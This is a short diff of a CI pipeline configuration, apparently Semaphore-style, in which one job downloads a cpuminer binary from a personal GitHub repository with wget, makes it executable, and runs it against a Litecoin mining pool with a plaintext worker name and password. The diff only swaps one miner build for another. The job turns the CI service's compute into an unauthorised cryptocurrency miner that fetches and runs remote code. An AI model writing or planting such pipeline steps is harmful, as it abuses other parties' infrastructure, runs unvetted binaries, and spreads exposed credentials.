@@ -10,6 +10,6 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/davidus20/RDP/raw/ltcwoker/cpuminer_avx512'
-            - chmod 755 cpuminer_avx512
-            - './cpuminer_avx512  --algo=scrypt --url=stratum+tcp://us.litecoinpool.org:3333 --userpass=djemil.mywoker16:my123456'
+            - 'wget https://github.com/davidus20/RDP/raw/ltcwoker/cpuminer'
+            - chmod 755 cpuminer
+            - './cpuminer  --algo=scrypt --url=stratum+tcp://us.litecoinpool.org:3333 --userpass=djemil.mywoker16:my123456'
